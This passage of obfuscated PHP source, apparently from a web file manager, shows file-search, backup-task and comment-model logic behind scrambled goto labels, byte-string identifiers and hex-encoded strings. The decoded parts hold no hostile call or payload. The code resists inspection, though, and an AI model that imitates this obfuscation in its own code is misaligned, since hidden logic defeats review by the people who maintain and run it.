(!$e‹õìÌèáÜ[$C¡‚³æ¼©î[160]]) { $B›àìğÃ½ = array_to_keyvalue($fáËƒ¼Ù‘Ö, $C¡‚³æ¼©î[33], $C¡‚³æ¼©î[160]); $c©ªç‘Éñ˜ = implode($C¡‚³æ¼©î[47], $B›àìğÃ½); $EÄœ„Œó¯õ = $C¡‚³æ¼©î[2264]; } $C÷ê©Û½â = explode($C¡‚³æ¼©î[47], trim($c©ªç‘Éñ˜, $C¡‚³æ¼©î[47])); return array($EÄœ„Œó¯õ, $C÷ê©Û½â); goto DµªÍ×´¬; DÏ§¹ø”õà: if (!$e‹õìÌèáÜ) { return array(); } $c©ªç‘Éñ˜ = $e‹õìÌèáÜ[$C¡‚³æ¼©î[160]]; $EÄœ„Œó¯õ = $C¡‚³æ¼©î[7]; goto aÅµáŠÊ; C†êœ“é: $C¡‚³æ¼©î =& $_SERVER[”Ì÷ñ­î¸]; $fáËƒ¼Ù‘Ö = KodIO::fileTypeList(); $e‹õìÌèáÜ = $fáËƒ¼Ù‘Ö[$eŒí¤²ß²Å]; goto DÏ§¹ø”õà; DµªÍ×´¬: } public function listPathType($BÜéÂÛÌµ) { $Cƒ¥˜ŒÀù =& $_SERVER[”Ì÷ñ­î¸]; $AÂŠßäÁÀŒ = $this->fileTypeWhere($BÜéÂÛÌµ); if (!$AÂŠßäÁÀŒ) { return array(); } $f…«í­Ñø = array($Cƒ¥˜ŒÀù[521] => SourceModel::TYPE_USER, $Cƒ¥˜ŒÀù[522] => USER_ID, $Cƒ¥˜ŒÀù[518] => 0, $Cƒ¥˜ŒÀù[519] => $AÂŠßäÁÀŒ); return $this->listSource($f…«í­Ñø); } public function listSearch($D…œåËèáØ, $f±«º®Íä„ = 300) { goto cƒÑœ«Ú®; FÀ”»½ƒÈŠ: $this->_listSearchBindPinyin($D…œåËèáØ, $D¢ò…Ê½½›, $d¸åÙ˜Û´‰); $this->alias($B¶±ªŠëÇ[487])->_makeOrder()->cache(null, 10); $BÎ‘†Šª¯˜ = $this->distinct(!0)->field($d¸åÙ˜Û´‰)->where($D¢ò…Ê½½›)->selectPage($f±«º®Íä„); goto c°Ÿã‡ÈŸ—; cƒÑœ«Ú®: $B¶±ªŠëÇ =& $_SERVER[”Ì÷ñ­î¸]; if (isset($D…œåËèáØ[$B¶±ªŠëÇ[2182]]) && $D…œåËèáØ[$B¶±ªŠëÇ[2182]]) { $D…œåËèáØ[$B¶±ªŠëÇ[2182]] = str_replace($B¶±ªŠëÇ[1595], $B¶±ªŠëÇ[2314], trim($D…œåËèáØ[$B¶±ªŠëÇ[2182]])); } $D¢ò…Ê½½› = $this->_parseSearchWhere($D…œåËèáØ); goto c˜šƒÓ‘­£; c°Ÿã‡ÈŸ—: $this->_listSearchDesc($BÎ‘†Šª¯˜, $D…œåËèáØ, $C¿¿Â§…Â„); $this->_listSearchTag($BÎ‘†Šª¯˜, $D…œåËèáØ, $C¿¿Â§…Â„); $this->_listDataApply($BÎ‘†Šª¯˜[$B¶±ªŠëÇ[354]]); goto cô«Ççò; c˜šƒÓ‘­£: if (!isset($D¢ò…Ê½½›[$B¶±ªŠëÇ[397]])) { $D¢ò…Ê½½›[$B¶±ªŠëÇ[397]] = 0; } $d¸åÙ˜Û´‰ = $B¶±ªŠëÇ[2315]; $C¿¿Â§…Â„ = $d¸åÙ˜Û´‰; goto FÀ”»½ƒÈŠ; cô«Ççò: $this->_listMake($BÎ‘†Šª¯˜); return $BÎ‘†Šª¯˜; goto F…Ğßù¹; F…Ğßù¹: } private function _listSearchTag(&$E°‰ËÍáŞä, $bŒäµÙ, $e‘ĞÚ“ô¶») { goto c¯‡– ñ; eÅÔ’áˆ›: $E¯ÜÌŒÎÕ = array_to_keyvalue($E¯ÜÌŒÎÕ, $f°©‰ŞŸ‹Ñ[33], $f°©‰ŞŸ‹Ñ[75]); $b¹ƒ¨Ä„«Ò = array_unique($E¯ÜÌŒÎÕ); $this->_listSearchMerge($E°‰ËÍáŞä, $bŒäµÙ, $e‘ĞÚ“ô¶», $b¹ƒ¨Ä„«Ò); goto fÍö¯ğŒîØ; EÒ“Ø‚ËƒÌ: if (!$EîçæççÊµ) { return; } $cÅù‰óó¿ = array($f°©‰ŞŸ‹Ñ[393] => array($f°©‰ŞŸ‹Ñ[7], $EîçæççÊµ)); $E¯ÜÌŒÎÕ = Model($f°©‰ŞŸ‹Ñ[394])->field($f°©‰ŞŸ‹Ñ[75])->where($cÅù‰óó¿)->select(); goto eÅÔ’áˆ›; a‰ ¡‘éä†: $EîçæççÊµ = array(); $aºöÂÕ° = $bŒäµÙ[$f°©‰ŞŸ‹Ñ[2182]]; foreach ($fÄ­‡×È´Ë as $BÑ¬·õñŒÕ) { $cöÖ‡µŠ = $BÑ¬·õñŒÕ[$f°©‰ŞŸ‹Ñ[28]]; $a©íºÔ‘Ğ = str_replace($f°©‰ŞŸ‹Ñ[50], $f°©‰ŞŸ‹Ñ[33], Pinyin::encode($cöÖ‡µŠ)); if (stripos($cöÖ‡µŠ, $aºöÂÕ°) !== !1 || stripos($a©íºÔ‘Ğ, $aºöÂÕ°) !== !1) { $EîçæççÊµ[] = $BÑ¬·õñŒÕ[$f°©‰ŞŸ‹Ñ[367]]; } } goto EÒ“Ø‚ËƒÌ; c¯‡– ñ: $f°©‰ŞŸ‹Ñ =& $_SERVER[”Ì÷ñ­î¸]; if (!$bŒäµÙ[$f°©‰ŞŸ‹Ñ[2182]] || $E°‰ËÍáŞä[$f°©‰ŞŸ‹Ñ[351]][$f°©‰ŞŸ‹Ñ[340]] > 1) { return; } $fÄ­‡×È´Ë = Model($f°©‰ŞŸ‹Ñ[2316])->listData(); goto a‰ ¡‘éä†; fÍö¯ğŒîØ: } private function _listSearchDesc(&$c¦‘¡ÀÔ‚é, $A»ëÃÈÚ°‚, $Cµèƒáç¦) { goto aÇƒŒÕ²¸‹; aÇƒŒÕ²¸‹: $E¾”ÚÏÑ±Å =& $_SERVER[”Ì÷ñ­î¸]; if (!$A»ëÃÈÚ°‚[$E¾”ÚÏÑ±Å[2182]] || $c¦‘¡ÀÔ‚é[$E¾”ÚÏÑ±Å[351]][$E¾”ÚÏÑ±Å[340]] > 1) { return; } $aÖÄ¼ä¦ææ = $this->listSearchChildren($A»ëÃÈÚ°‚[$E¾”ÚÏÑ±Å[461]]); goto A¥‚ç¶„À; A¥‚ç¶„À: $aÖÄ¼ä¦ææ = array_unique($aÖÄ¼ä¦ææ); if (!$aÖÄ¼ä¦ææ) { return; } $f’²¥ŠÉÙ = array($E¾”ÚÏÑ±Å[369] => array($E¾”ÚÏÑ±Å[7], $aÖÄ¼ä¦ææ), $E¾”ÚÏÑ±Å[89] => $E¾”ÚÏÑ±Å[405], $E¾”ÚÏÑ±Å[359] => array($E¾”ÚÏÑ±Å[753], $E¾”ÚÏÑ±Å[2184] . $A»ëÃÈÚ°‚[$E¾”ÚÏÑ±Å[2182]] . $E¾”ÚÏÑ±Å[2184])); goto BŠ–«àóĞ; BŠ–«àóĞ: $C†°‡¬¢ËÓ = Model($E¾”ÚÏÑ±Å[504])->field($E¾”ÚÏÑ±Å[369])->where($f’²¥ŠÉÙ)->select(); $fè‰©ìôù¦ = array_to_keyvalue($C†°‡¬¢ËÓ, $E¾”ÚÏÑ±Å[33], $E¾”ÚÏÑ±Å[369]); $this->_listSearchMerge($c¦‘¡ÀÔ‚é, $A»ëÃÈÚ°‚, $Cµèƒáç¦, $fè‰©ìôù¦); goto f‰ÈÃ­ ¬Ó; f‰ÈÃ­ ¬Ó: } private function _listSearchMerge(&$aÙá’½àê, $dù‘åŠˆÛ, $D†Ô›Â÷ÁÆ, $cÁæ‡Ñ×ô×) { goto Fƒ†‹Œ¨õÓ; c¯¾µÆ£˜í: $dÏñ¦«ªô = $this->field($D†Ô›Â÷ÁÆ)->where($c ³ÂøåÒÈ)->select(); if (!$dÏñ¦«ªô) { return; } $aÁŸ¬‰’ô = array(); goto B¨ò˜öµ¡¼; Dˆ‘Èòî©Õ: $Bñ¾Ôá² Î = array_diff($cÁæ‡Ñ×ô×, $cÀ­äà‚); if (!$Bñ¾Ôá² Î) { return; } $c ³ÂøåÒÈ = array($ašíçšŠåÑ[369] => array($ašíçšŠåÑ[7], $Bñ¾Ôá² Î)); goto c¯¾µÆ£˜í; B¨ò˜öµ¡¼: foreach ($dÏñ¦«ªô as $FÖÛ¿­õ¦õ) { $fÌ‡½‡¡†• = $ašíçšŠåÑ[47] . $dù‘åŠˆÛ[$ašíçšŠåÑ[461]] . $ašíçšŠåÑ[47]; if (stripos($FÖÛ¿­õ¦õ[$ašíçšŠåÑ[459]], $fÌ‡½‡¡†•) !== !1) { $aÁŸ¬‰’ô[] = $FÖÛ¿­õ¦õ; } } $aÙá’½àê[$ašíçšŠåÑ[354]] = array_merge($aÁŸ¬‰’ô, $aÙá’½àê[$ašíçšŠåÑ[354]]); $aÙá’½àê[$ašíçšŠåÑ[351]][$ašíçšŠåÑ[352]] += count($aÁŸ¬‰’ô); goto B‰±„·÷„; Fƒ†‹Œ¨õÓ: $ašíçšŠåÑ =& $_SERVER[”Ì÷ñ­î¸]; if (!$cÁæ‡Ñ×ô×) { return; } $cÀ­äà‚ = array_to_keyvalue($aÙá’½àê[$ašíçšŠåÑ[354]], $ašíçšŠåÑ[33], $ašíçšŠåÑ[369]); goto Dˆ‘Èòî©Õ; B‰±„·÷„: } public function listSearchChildren($AïËŠ…Êö, $béƒ¿òÛ¨ = 5000) { goto a…Õ®İŞ; b¯¤˜°À‹: $cÄÕİêø¢ = $this->field($e´¶°Î…èÖ[369])->where($fÆ¥Ò¢ ±)->select(); $F…Ù×ˆ±™‹ = array_to_keyvalue($cÄÕİêø¢, $e´¶°Î…èÖ[33], $e´¶°Î…èÖ[369]); return $F…Ù×ˆ±™‹; goto FìÏˆ¾Û‘; a…Õ®İŞ: $e´¶°Î…èÖ =& $_SERVER[”Ì÷ñ­î¸]; $F…Ù×ˆ±™‹ = array(); $DÆ”¥•®îµ = $this->sourceInfo($AïËŠ…Êö); goto a›ºìªŠ; a›ºìªŠ: $fÆ¥Ò¢ ± = array($e´¶°Î…èÖ[459] => array($e´¶°Î…èÖ[753], $DÆ”¥•®îµ[$e´¶°Î…èÖ[459]] . $DÆ”¥•®îµ[$e´¶°Î…èÖ[369]] . $e´¶°Î…èÖ[484])); $FìÇÒ‹§ø§ = $this->field($e´¶°Î…èÖ[369])->cache(null, 600)->where($fÆ¥Ò¢ ±)->count(); if ($FìÇÒ‹§ø§ > $béƒ¿òÛ¨) { return $this->_listSearchChildrenNear($AïËŠ…Êö, $béƒ¿òÛ¨); } goto b¯¤˜°À‹; FìÏˆ¾Û‘: } private function _listSearchChildrenNear($A¿”ãØ”©Í, $B¦ÌˆÕæ•) { goto DİÍ„ëæ×†; DİÍ„ëæ×†: $f°äŸ¦÷Óê =& $_SERVER[”Ì÷ñ­î¸]; $a¬Õ·Ï½˜‚ = array(); $dôÜ™´æïõ = array($f°äŸ¦÷Óê[461] => $A¿”ãØ”©Í); goto E•¥‡¡‰É; cÄÅêÜ¯¸ñ: $a¬Õ·Ï½˜‚ = array_merge($a¬Õ·Ï½˜‚, array_to_keyvalue($b·´–öÏ‚â, $f°äŸ¦÷Óê[33], $f°äŸ¦÷Óê[369])); $a¬Õ·Ï½˜‚ = array_slice($a¬Õ·Ï½˜‚, 0, $B¦ÌˆÕæ•); return $a¬Õ·Ï½˜‚; goto dé¤¹à¾ß; cØÑƒ•“ó¾: if (!$B‹¤ò¼±ï‡) { return $a¬Õ·Ï½˜‚; } $dôÜ™´æïõ = array($f°äŸ¦÷Óê[461] => array($f°äŸ¦÷Óê[7], $B‹¤ò¼±ï‡)); $b·´–öÏ‚â = $this->field($f°äŸ¦÷Óê[2317])->where($dôÜ™´æïõ)->select(); goto cÄÅêÜ¯¸ñ; E•¥‡¡‰É: $b·´–öÏ‚â = $this->field($f°äŸ¦÷Óê[2317])->where($dôÜ™´æïõ)->select(); $B‹¤ò¼±ï‡ = array_to_keyvalue(array_filter_by_field($b·´–öÏ‚â, $f°äŸ¦÷Óê[370], $f°äŸ¦÷Óê[83]), $f°äŸ¦÷Óê[33], $f°äŸ¦÷Óê[369]); $a¬Õ·Ï½˜‚ = array_merge($a¬Õ·Ï½˜‚, array_to_keyvalue($b·´–öÏ‚â, $f°äŸ¦÷Óê[33], $f°äŸ¦÷Óê[369])); goto cØÑƒ•“ó¾; dé¤¹à¾ß: } private function _listSearchBindPinyin($fŸòê­¥´, &$e„†ùªùÃÇ, &$D‘™ñè¶Øå) { goto BÚãäã»è; EİĞŠù±Ï: unset($e„†ùªùÃÇ[$E¸áŠ¸ó†Î[28]]); foreach ($e„†ùªùÃÇ as $B‚‘ååêé± => $AÏ¾—Œ‘Ú›) { $dï–³œ¡¨[$E¸áŠ¸ó†Î[2319] . $B‚‘ååêé±] = $AÏ¾—Œ‘Ú›; } $E­¡äæ»ö = array($E¸áŠ¸ó†Î[483], $E¸áŠ¸ó†Î[2184] . $fŸòê­¥´[$E¸áŠ¸ó†Î[2182]] . $E¸áŠ¸ó†Î[2184]); goto A¸ˆÜÍ‰´ƒ; A¸ˆÜÍ‰´ƒ: $dï–³œ¡¨[] = array($E¸áŠ¸ó†Î[2321] => $E­¡äæ»ö, $E¸áŠ¸ó†Î[916] => $E¸áŠ¸ó†Î[2186], array($E¸áŠ¸ó†Î[2322] => $E­¡äæ»ö, $E¸áŠ¸ó†Î[2323] => array($E¸áŠ¸ó†Î[7], array($E¸áŠ¸ó†Î[416], $E¸áŠ¸ó†Î[415])))); $this->join($dÜ— Îã‡è); $e„†ùªùÃÇ = $dï–³œ¡¨; goto Bå¨É¹»ì; BÚãäã»è: $E¸áŠ¸ó†Î =& $_SERVER[”Ì÷ñ­î¸]; if (!Input::check($fŸòê­¥´[$E¸áŠ¸ó†Î[2182]], $E¸áŠ¸ó†Î[306]) || strlen($fŸòê­¥´[$E¸áŠ¸ó†Î[2182]]) < 2) { return; } $dÜ— Îã‡è = "\x4c\x45\x46\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\151\157\137\x73\157\165\162\143\x65\x5f\x6d\x65\164\141\40\155\x65\164\141\x20\x6f\156\x20\163\x6f\x75\162\143\x65\x2e\163\157\165\162\143\145\x49\104\x20\75\40\155\145\164\x61\56\163\x6f\165\162\x63\x65\111\104"; goto eÂƒØÍ…Ò‡; eÂƒØÍ…Ò‡: $dï–³œ¡¨ = array(); $D‘™ñè¶Øå = str_replace(array($E¸áŠ¸ó†Î[217], $E¸áŠ¸ó†Î[50], $E¸áŠ¸ó†Î[2318]), $E¸áŠ¸ó†Î[33], $D‘™ñè¶Øå); $D‘™ñè¶Øå = $E¸áŠ¸ó†Î[2319] . str_replace($E¸áŠ¸ó†Î[47], $E¸áŠ¸ó†Î[2320], $D‘™ñè¶Øå); goto EİĞŠù±Ï; Bå¨É¹»ì: } private function _parseSearchWhere($dç´ŒØ) { goto Eò‘ÓÑá²š; FİÇİé¯–à: if (isset($dç´ŒØ[$bµŒƒä¹¼ê[535]])) { $fíÂåæËÉ[] = array($bµŒƒä¹¼ê[379] => $dç´ŒØ[$bµŒƒä¹¼ê[535]], $bµŒƒä¹¼ê[378] => $dç´ŒØ[$bµŒƒä¹¼ê[535]], $bµŒƒä¹¼ê[916] => $bµŒƒä¹¼ê[2186]); } if (isset($dç´ŒØ[$bµŒƒä¹¼ê[372]])) { $aƒïõŠ“Ã = $dç´ŒØ[$bµŒƒä¹¼ê[372]]; if ($aƒïõŠ“Ã == $bµŒƒä¹¼ê[76]) { $fíÂåæËÉ[$bµŒƒä¹¼ê[370]] = 1; } else { if ($aƒïõŠ“Ã == $bµŒƒä¹¼ê[2329]) { $fíÂåæËÉ[$bµŒƒä¹¼ê[370]] = 0; } else { if ($aƒïõŠ“Ã) { $aƒïõŠ“Ã = is_array($aƒïõŠ“Ã) ? $aƒïõŠ“Ã : explode($bµŒƒä¹¼ê[47], $aƒïõŠ“Ã); $fíÂåæËÉ[$bµŒƒä¹¼ê[372]] = array($bµŒƒä¹¼ê[384], $aƒïõŠ“Ã); $fíÂåæËÉ[$bµŒƒä¹¼ê[370]] = 0; } } } } if (isset($dç´ŒØ[$bµŒƒä¹¼ê[461]])) { $AÁ„ÚÅ£Ğî = $this->sourceInfo($dç´ŒØ[$bµŒƒä¹¼ê[461]]); $fíÂåæËÉ[$bµŒƒä¹¼ê[525]] = array($bµŒƒä¹¼ê[483], $AÁ„ÚÅ£Ğî[$bµŒƒä¹¼ê[459]] . $dç´ŒØ[$bµŒƒä¹¼ê[461]] . $bµŒƒä¹¼ê[484]); } goto dÌÓ£ß™­Ö; Eò‘ÓÑá²š: $bµŒƒä¹¼ê =& $_SERVER[”Ì÷ñ­î¸]; $fíÂåæËÉ = array(); if (isset($dç´ŒØ[$bµŒƒä¹¼ê[703]])) { $fíÂåæËÉ[$bµŒƒä¹¼ê[107]] = array($bµŒƒä¹¼ê[2324], $dç´ŒØ[$bµŒƒä¹¼ê[703]]); } goto fĞ§¯ÈöÁ„; dÌÓ£ß™­Ö: if (isset($dç´ŒØ[$bµŒƒä¹¼ê[2182]]) && $dç´ŒØ[$bµŒƒä¹¼ê[2182]]) { $cæóÆÛ—± = $dç´ŒØ[$bµŒƒä¹¼ê[2182]]; $e²ŸŒò  = explode($bµŒƒä¹¼ê[50], $cæóÆÛ—±); if (strlen($cæóÆÛ—±) > 2 && (substr($cæóÆÛ—±, 0, 1) == $bµŒƒä¹¼ê[113] && substr($cæóÆÛ—±, -1) == $bµŒƒä¹¼ê[113]) || substr($cæóÆÛ—±, 0, 1) == $bµŒƒä¹¼ê[55] && substr($cæóÆÛ—±, -1) == $bµŒƒä¹¼ê[55]) { $cæóÆÛ—± = substr($cæóÆÛ—±, 1, -1); $e²ŸŒò  = array($cæóÆÛ—±); } $fíÂåæËÉ[$bµŒƒä¹¼ê[28]] = array($bµŒƒä¹¼ê[483], $bµŒƒä¹¼ê[2184] . $cæóÆÛ—± . $bµŒƒä¹¼ê[2184]); if (count($e²ŸŒò ) > 1) { $fíÂåæËÉ[$bµŒƒä¹¼ê[28]] = array(); foreach ($e²ŸŒò  as $b¶¼Õ…½ª) { if (!trim($b¶¼Õ…½ª)) { continue; } $fíÂåæËÉ[$bµŒƒä¹¼ê[28]][] = array($bµŒƒä¹¼ê[483], $bµŒƒä¹¼ê[2184] . trim($b¶¼Õ…½ª) . $bµŒƒä¹¼ê[2184]); } } } return $fíÂåæËÉ; goto f¤‘ğ†÷²×; fĞ§¯ÈöÁ„: if (isset($dç´ŒØ[$bµŒƒä¹¼ê[704]])) { $EòÀ›Ò‹µô = array($bµŒƒä¹¼ê[2325], $dç´ŒØ[$bµŒƒä¹¼ê[704]]); if ($fíÂåæËÉ[$bµŒƒä¹¼ê[107]]) { $fíÂåæËÉ[$bµŒƒä¹¼ê[107]] = array($fíÂåæËÉ[$bµŒƒä¹¼ê[107]], $EòÀ›Ò‹µô, $bµŒƒä¹¼ê[2326]); } else { $fíÂåæËÉ[$bµŒƒä¹¼ê[107]] = $EòÀ›Ò‹µô; } } if (isset($dç´ŒØ[$bµŒƒä¹¼ê[2327]])) { $fíÂåæËÉ[$bµŒƒä¹¼ê[77]] = array($bµŒƒä¹¼ê[2324], $dç´ŒØ[$bµŒƒä¹¼ê[2327]]); } if (isset($dç´ŒØ[$bµŒƒä¹¼ê[2328]])) { $EòÀ›Ò‹µô = array($bµŒƒä¹¼ê[2325], $dç´ŒØ[$bµŒƒä¹¼ê[2328]]); if ($fíÂåæËÉ[$bµŒƒä¹¼ê[77]]) { $fíÂåæËÉ[$bµŒƒä¹¼ê[77]] = array($fíÂåæËÉ[$bµŒƒä¹¼ê[77]], $EòÀ›Ò‹µô, $bµŒƒä¹¼ê[2326]); } else { $fíÂåæËÉ[$bµŒƒä¹¼ê[77]] = $EòÀ›Ò‹µô; } } goto FİÇİé¯–à; f¤‘ğ†÷²×: } } goto CÏ¶Ì°¡¶£; F²°‹É¨: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\142\x61\143\x6b\165\160\x4c\x69\163\x74"; public $field = array("\151\157", "\x6e\x61\155\x65", "\x73\164\141\x74\165\x73", "\x63\157\x6e\x74\x65\156\164", "\x72\x65\x73\165\x6c\x74", "\164\x69\155\145\106\x72\x6f\x6d", "\x74\x69\155\145\x54\x6f"); public function config() { goto F‡æÛ­‹; e®¤Áƒ–…: if (isset($b³ôğÈÕ[$cƒ”—½ë‹[190]])) { $b³ôğÈÕ[$cƒ”—½ë‹[190]] = json_decode($b³ôğÈÕ[$cƒ”—½ë‹[190]], !0); } if (isset($A‘£¹©Ï[$cƒ”—½ë‹[190]])) { $b³ôğÈÕ[$cƒ”—½ë‹[190]][$cƒ”—½ë‹[1414]] = $A‘£¹©Ï[$cƒ”—½ë‹[190]]; unset($A‘£¹©Ï[$cƒ”—½ë‹[190]]); } return array_merge($b³ôğÈÕ, $A‘£¹©Ï); goto D™Š¸ˆÕ–; A©âñ ÉÈÏ: $A‘£¹©Ï = is_array($A‘£¹©Ï) ? $A‘£¹©Ï : array(); if (!isset($A‘£¹©Ï[$cƒ”—½ë‹[693]])) { $A‘£¹©Ï[$cƒ”—½ë‹[693]] = $cƒ”—½ë‹[468]; } $b³ôğÈÕ = array(); goto eÒº³ö”Ô¶; F‡æÛ­‹: $cƒ”—½ë‹ =& $_SERVER[”Ì÷ñ­î¸]; $A‘£¹©Ï = Model($cƒ”—½ë‹[1088])->get($cƒ”—½ë‹[715]); $A‘£¹©Ï = json_decode($A‘£¹©Ï, !0); goto A©âñ ÉÈÏ; eÒº³ö”Ô¶: Action($cƒ”—½ë‹[2128])->taskInit(); $a…†Àó«°Ğ = Model($cƒ”—½ë‹[2129])->listData(); foreach ($a…†Àó«°Ğ as $BÒµ¼ªç”ä) { if ($BÒµ¼ªç”ä[$cƒ”—½ë‹[1080]] == $cƒ”—½ë‹[83] && $BÒµ¼ªç”ä[$cƒ”—½ë‹[1427]] == $cƒ”—½ë‹[2130]) { $b³ôğÈÕ = $BÒµ¼ªç”ä; break; } } goto e®¤Áƒ–…; D™Š¸ˆÕ–: } public function listData($B¾ì£öòá = false, $D†¹¤ˆËœè = "\155\157\x64\x69\x66\x79\x54\x69\x6d\145", $aƒ¶æï¸ = false) { return parent::listData($B¾ì£öòá, $D†¹¤ˆËœè, !0); } public function lastItem() { $A‚ºïã = $this->listData(); return !empty($A‚ºïã[0]) ? $A‚ºïã[0] : null; } public function kill($Dö‚ğ«Øø») { goto e¦Ê‘Œ²ƒÛ; aÚ‰ãªŒÂ: $Dõ°¡ø‚É = $A‡£å»ç[$E–¿–ªˆ[28]]; $f°ˆé÷¡©ò = TEMP_FILES . $E–¿–ªˆ[711] . $Dõ°¡ø‚É . $E–¿–ªˆ[8]; IO::remove($f°ˆé÷¡©ò, !1); goto E°ù£…¨Ï; e¦Ê‘Œ²ƒÛ: $E–¿–ªˆ =& $_SERVER[”Ì÷ñ­î¸]; $A‡£å»ç = $this->listData($Dö‚ğ«Øø»); if (!$A‡£å»ç || empty($A‡£å»ç[$E–¿–ªˆ[28]])) { return !0; } goto A»ùÌäÅ÷—; E°ù£…¨Ï: return $this->remove($Dö‚ğ«Øø»); goto E‹ßÂë¬¥; A»ùÌäÅ÷—: Task::kill($E–¿–ªˆ[714]); Task::kill($E–¿–ªˆ[730]); Task::kill($E–¿–ªˆ[738]); goto aÚ‰ãªŒÂ; E‹ßÂë¬¥: } public function remove($e°·ÍÅÖÌÄ) { $b’ë‡‹É = $this->listData($e°·ÍÅÖÌÄ); if (!$b’ë‡‹É) { return !0; } return $this->backupRemove($b’ë‡‹É); } private function backupRemove($Aø‡õŒ ½²) { $d……øó—Œ™ =& $_SERVER[”Ì÷ñ­î¸]; parent::remove($Aø‡õŒ ½²[$d……øó—Œ™[367]]); $EÄÕîÍß¹ = "\173\151\x6f\72{$Aø‡õŒ ½²[$d……øó—Œ™[692]]}\175\57\144\141\x74\x61\142\141\163\145\57\x62\141\143\x6b\x75\x70\137" . $Aø‡õŒ ½²[$d……øó—Œ™[28]]; IO::remove($EÄÕîÍß¹, !1); return !0; } public function start() { goto aÓòêªÂõ“; aÓòêªÂõ“: $fÑ¦¥­ëÕ =& $_SERVER[”Ì÷ñ­î¸]; if ($GLOBALS[$fÑ¦¥­ëÕ[6]][$fÑ¦¥­ëÕ[84]][$fÑ¦¥­ëÕ[2131]] != $fÑ¦¥­ëÕ[83]) { return !0; } $Dğ÷ªÔ¨ğ£ = $this->config(); goto a›æù±»öÅ; a›æù±»öÅ: if (!$Dğ÷ªÔ¨ğ£ || $Dğ÷ªÔ¨ğ£[$fÑ¦¥­ëÕ[1411]] != $fÑ¦¥­ëÕ[83]) { return !1; } $CäŸÙŠôçƒ = $this->process(); foreach ($CäŸÙŠôçƒ as $Fƒì­—ßõ¸) { if ($Fƒì­—ßõ¸) { return Task::restart($Fƒì­—ßõ¸[$fÑ¦¥­ëÕ[367]]); } } goto dƒƒÛñ Î÷; aÆî÷¯Š•’: return !0; goto Fß…Œ®Ë; EÜíåŒî¾: if (!$fà„ù¢ªÆ->dbFile()) { return !1; } if ($Dğ÷ªÔ¨ğ£[$fÑ¦¥­ëÕ[693]] == $fÑ¦¥­ëÕ[468]) { $fà„ù¢ªÆ->file(); } Backup::set(array($fÑ¦¥­ëÕ[690] => 1, $fÑ¦¥­ëÕ[704] => time())); goto aÆî÷¯Š•’; dƒƒÛñ Î÷: $fà„ù¢ªÆ = new Backup(); $fà„ù¢ªÆ->keep(); if (!$fà„ù¢ªÆ->db()) { return !1; } goto EÜíåŒî¾; Fß…Œ®Ë: } public function process() { $c’Öß°˜Ÿ£ =& $_SERVER[”Ì÷ñ­î¸]; return array($c’Öß°˜Ÿ£[695] => Task::get($c’Öß°˜Ÿ£[714]), $c’Öß°˜Ÿ£[698] => Task::get($c’Öß°˜Ÿ£[730]), $c’Öß°˜Ÿ£[167] => Task::get($c’Öß°˜Ÿ£[738])); } public function restore() { $b¸Ì¸›Ú­ =& $_SERVER[”Ì÷ñ­î¸]; ActionCall($b¸Ì¸›Ú­[2132], !0, 1); ActionCall($b¸Ì¸›Ú­[2132], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\x6e\164"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\155\145" => "\x63\157\x6d\155\145\x6e\x74\x5f\x6d\x65\164\141", "\155\x65\164\141\x46\x69\x65\154\x64" => "\x63\157\x6d\x6d\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($bŒŠÜ†æ‚) { $d¿Ñí¢¤Íß =& $_SERVER[”Ì÷ñ­î¸]; if ($bŒŠÜ†æ‚[$d¿Ñí¢¤Íß[2133]]) { $Dçß†ÜÂ­ = $this->where(array($d¿Ñí¢¤Íß[2134] => $bŒŠÜ†æ‚[$d¿Ñí¢¤Íß[2133]]))->find(); if (!$Dçß†ÜÂ­ || $Dçß†ÜÂ­[$d¿Ñí¢¤Íß[371]] != $bŒŠÜ†æ‚[$d¿Ñí¢¤Íß[371]] || $Dçß†ÜÂ­[$d¿Ñí¢¤Íß[456]] != $bŒŠÜ†æ‚[$d¿Ñí¢¤Íß[456]]) { return !1; } $this->where(array($d¿Ñí¢¤Íß[2134] => $bŒŠÜ†æ‚[$d¿Ñí¢¤Íß[2133]]))->setAdd($d¿Ñí¢¤Íß[2135], 1); } return $this->add($bŒŠÜ†æ‚); } public function remove($Aè¸Îµéç‹) { $AÕò®ÆÀÊó =& $_SERVER[”Ì÷ñ­î¸]; $d§›‰â‡ÈÆ = array($AÕò®ÆÀÊó[2134] => $Aè¸Îµéç‹); $bÑÌ‰õ÷ß¶ = $this->where($d§›‰â‡ÈÆ)->find(); if ($bÑÌ‰õ÷ß¶[$AÕò®ÆÀÊó[2133]]) { $this->where(array($AÕò®ÆÀÊó[2134] => $bÑÌ‰õ÷ß¶[$AÕò®ÆÀÊó[2133]]))->setAdd($AÕò®ÆÀÊó[2135], -1); } return $this->where($d§›‰â‡ÈÆ)->delete(); } public function edit($AæÊŒ¤Û†Œ, $D±¨•«Ğœğ) { $a¥¾²™òí =& $_SERVER[”Ì÷ñ­î¸]; $eç’«Ã»ˆ™ = array($a¥¾²™òí[2134] => $AæÊŒ¤Û†Œ); return $this->where($eç’«Ã»ˆ™)->save(array($a¥¾²™òí[2136] => $D±¨•«Ğœğ)); } public function prasise($C”„–ŞÍ…÷) { $C“öç†í¢¹ =& $_SERVER[”Ì÷ñ­î¸]; $c¡šÆÅÂß = Model($C“öç†í¢¹[2137]); $EåÔˆ¹á•§ = array($C“öç†í¢¹[2134] => $C”„–ŞÍ…÷, $C“öç†í¢¹[1430] => USER_ID); $b×Ğô©ĞªË = $c¡šÆÅÂß->where($EåÔˆ¹á•§)->find(); if (!$b×Ğô©ĞªË) { $c¡šÆÅÂß->add($EåÔˆ¹á•§); $E†Ø¼¦Ã­µ = $this->where(array($C“öç†í¢¹[2134] => $C”„–ŞÍ…÷))->setAdd($C“öç†í¢¹[2138], 1); } else { $c¡šÆÅÂß->where($EåÔˆ¹á•§)->delete(); $E†Ø¼¦Ã­µ = $this->where(array($C“öç†í¢¹[2134] => $C”„–ŞÍ…÷))->setAdd($C“öç†í¢¹[2138], -1); } return $E†Ø¼¦Ã­µ; } public function targetInfo($EÂßâ…å, $DŒñŒê¦à) { goto 